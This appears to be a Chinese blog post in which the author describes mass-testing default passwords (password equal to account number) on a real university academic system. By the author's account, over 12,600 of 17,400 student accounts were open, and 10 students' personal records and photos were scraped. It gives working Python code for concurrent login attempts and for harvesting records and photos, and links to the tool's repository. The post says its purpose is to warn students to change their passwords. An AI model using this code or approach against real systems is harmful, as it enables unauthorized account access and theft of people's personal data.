---
layout:     post
title:      "Python 第一个爬虫-教务系统信息收集"
subtitle:   ""
date:       2018-02-24 09:25:00
categories: 
    - 爬虫
tags:
    - 爬虫
    - Python
---
## 初衷
**本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！**
<!-- more -->
作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，**个人信息泄露情况非常严重！**

## 结果
先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：

| 序号 | 学院 | 年级 | 在网账号 | 可爬账号 | 年级占比 |
| :-: | :-: | :-: | :-: | :-: | :-: |
|1   |本一   |2014   |3157   |1998   |63.29%   |
|2   |本一   |2015   |3328   |2234   |67.13%   |
|3   |本一   |2016   |3641   |3066   |84.21%   |
|4   |本一   |2017   |3497   |3326   |95.11%   |
|5   |本三   |2014   |1759   |303   |17.23%   |
|6   |本三    |2015   |1643   |620   |37.74%   |
|7   |本三    |2016   |1605   |1434   |89.35%   |
|8   |本三    |2017   |1552   |639   |41.17%   |

**介于初衷，只爬了 10 个账号的信息，以示严重性！**

![爬到的学籍信息](http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 过程
本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。

Scrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。

这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。

![系统的登录界面](http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：

![登录请求 ( POST )](http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文

![表单参数](http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。

![登录的响应体](http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。

先引入依赖
```python
import sys
import logging
import gevent
import urllib3
import pathlib
from PIL import Image
from io import BytesIO
from lxml import etree
```
创建 HTTP 连接池
```python
http = urllib3.HTTPConnectionPool(
    host=settings.SERVER_HOST,
    port=settings.SERVER_PORT,
    strict=False,
    maxsize=100,
    block=False,
    retries=100,
    timeout=10
)
```

请求头的一些固定信息可以预先设定好，伪装浏览器
```python
header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Cache-Control': 'max-age=0',
    'Connection': 'Keep-alive',
    'Host': settings.SERVER_HOST,
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
}
```
登录并验证是否是初始密码
```python
# 账号校验器
class InfoValidate(object):
    def __init__(self):
        self.logger = InfoMain.logger
        self.http = InfoMain.http
        # 有效账号
        self.account_valid = []
        # 可爬账号
        self.account_available = []

    def validate(self, all_account):
        # 将所有校验过程加入队列
        jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]
        gevent.joinall(jobs, timeout=0)

    def validate_account(self, http, account):
        # 登录请求参数
        param = {"zjh": account, "mm": account}
        header = headers.header
        response = http.request('POST', settings.URL_LOGIN, fields=param, headers=header)
        self.logger.info('发送请求>>{}'.format(param))
        self.logger.info(response.status)
        # 响应体解码
        res_text = response.data.decode('GB2312', 'ignore')

        if res_text.find('密码不正确') > -1:
            # 密码有误
            self.account_valid.append(account)
        elif not res_text.find('证件号不存在') > -1:
            # 账号可爬
            self.account_available.append(account)
            self.account_valid.append(account)
            self.logger.info("账号可用>>>{}".format(account))
```
至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律

![学籍信息页](http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


![table 的结构](http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

一系列的信息都包裹在 ```<td width = "275"></td> ```之间，对应的 xpath 表达式即为 ```//td[starts-with(@width,"275")]/text()```

基于之前对账号的测试，爬取学籍信息

```python
# 信息收集器
class InfoCollect(object):
    def __init__(self):
        self.logger = InfoMain.logger
        self.http = InfoMain.http
        # 功能模块
        self.mod_get_roll_info = settings.MOD_ROLL_INFO
        self.mod_get_roll_img = settings.MOD_ROLL_IMG

    def get_info_queue(self, accounts):
        # 将所有信息收集过程加入队列
        jobs = [gevent.spawn(self.get_info, a) for a in accounts]
        gevent.joinall(jobs, timeout=0)

    def get_info(self, stuid):
        # 登录
        param = {'zjh': stuid, 'mm': stuid}
        response = self.http.request('POST', settings.URL_LOGIN, fields=param)
        # 保存 Cookie
        cookie = response.headers['Set-Cookie'].replace('; path=/', '')
        header = headers.header
        header['cookie'] = cookie
        # 学籍信息
        if self.mod_get_roll_info:
            # 带 Cookie 访问学籍信息页
            response_xjxx = self.http.request('GET', settings.URL_XJXX, headers=header)
            text = response_xjxx.data.decode('GB2312', 'ignore')
            # 解析页面内容
            selector = etree.HTML(text)
            text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
            # 学籍信息
            result = []
            for info in text_arr:
                result.append(info.strip())
            self.save_info(result)
        # 学籍照片
        if self.mod_get_roll_img:
            response_xjzp = self.http.request('GET', settings.URL_XJZP, headers=header)
            image = Image.open(BytesIO(response_xjzp.data))
            setpath = settings.PATH_IMG_SAVE
            path = pathlib.Path(setpath)
            if not path.exists():
                path.mkdir()
            setpath = setpath + '/' + stuid + '.jpg'
            image.save(setpath)
            self.logger.info('保存照片>>>{}'.format(setpath))

        # 登出
        self.http.request('POST', settings.URL_LOGOUT, headers=header)
```

至此，已经实现了所有信息的获取以及照片的保存。

没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。

相关开源项目：URP_Spider  [https://github.com/JamesZBL/URP_Spider](https://github.com/JamesZBL/URP_Spider)
